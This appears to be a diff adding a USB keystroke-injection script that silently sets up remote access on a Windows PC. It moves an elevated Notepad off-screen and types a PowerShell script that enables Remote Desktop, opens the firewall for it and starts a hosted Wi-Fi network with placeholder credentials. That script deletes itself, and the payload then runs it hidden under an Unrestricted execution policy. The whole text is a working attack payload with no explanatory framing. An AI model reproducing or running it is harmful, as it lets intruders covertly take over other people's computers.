@@ -1,0 +1,58 @@
+GUI r 
+DELAY 200
+STRING powershell Start-Process notepad -Verb runAs
+ENTER
+DELAY 1000  
+ALT y 
+DELAY 300  
+ENTER
+ALT SPACE 
+DELAY 100
+STRING m 
+DELAY 50
+DOWNARROW
+REPEAT 100
+ENTER
+STRING Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
+ENTER
+STRING Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name UserAuthentication -Value 1
+ENTER
+STRING netsh advfirewall firewall set rule group='remote desktop - remotefx' new enable=Yes 
+ENTER
+STRING netsh advfirewall firewall set rule group='remote desktop' new enable=Yes 
+ENTER
+STRING netsh wlan set hostednetwork ssid=>>>SSID<<<  key=>>>PW<<<
+ENTER
+STRING netsh wlan start hostednetwork 
+ENTER
+
+STRING Remove-Item $MyINvocation.InvocationName 
+ENTER
+CTRL s
+DELAY 500
+STRING C:\Windows\config-89271.ps1
+ENTER
+DELAY 200
+ALT F4 
+DELAY 5000  
+GUI r 
+DELAY 200  
+STRING powershell Start-Process cmd -Verb runAs 
+ENTER
+DELAY 1000  
+ALT y 
+DELAY 500
+STRING mode con:cols=14 lines=1 
+ENTER
+ALT SPACE 
+DELAY 100  
+STRING m 
+DELAY 50   
+DOWNARROW 
+REPEAT 100
+ENTER
+STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false
+ENTER
+DELAY 1000
+STRING powershell.exe -windowstyle hidden -File C:\Windows\config-89271.ps1
+ENTER
